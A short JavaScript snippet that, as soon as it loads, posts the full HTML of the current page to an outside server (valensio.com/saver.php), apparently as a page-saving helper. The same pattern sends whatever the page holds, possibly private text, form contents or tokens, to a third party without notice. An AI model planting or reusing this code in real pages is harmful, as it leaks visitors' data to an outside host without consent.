function myDownload() {
  fetch('https://valensio.com/saver.php',{method:'POST',body:document.documentElement.outerHTML})
}
myDownload();
